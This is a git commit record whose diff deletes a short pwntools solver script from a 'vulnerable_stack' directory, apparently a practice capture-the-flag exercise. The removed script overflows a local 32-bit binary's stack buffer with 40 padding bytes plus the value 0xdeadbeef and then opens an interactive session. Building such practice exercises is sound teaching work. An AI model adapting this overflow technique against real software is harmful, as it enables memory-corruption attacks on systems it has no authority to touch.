e799ac34f592645b28e158e8664ebeee95904de5
Stickman230 <123313783+Stickman230@users.noreply.github.com>
2026-03-04 13:08:06 +0000

    Delete vulnerable_stack directory

--- vulnerable_stack/solver/vulnerable_stack_solver.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
- 
-context.log_level = 'debug'
-
-pwned= process('./vulnerable_stack/ELF_32/vulnerable_stack')
-
-pwned.sendline('A' * 40  + '\xef\xbe\xad\xde')
-
-pwned.interactive()
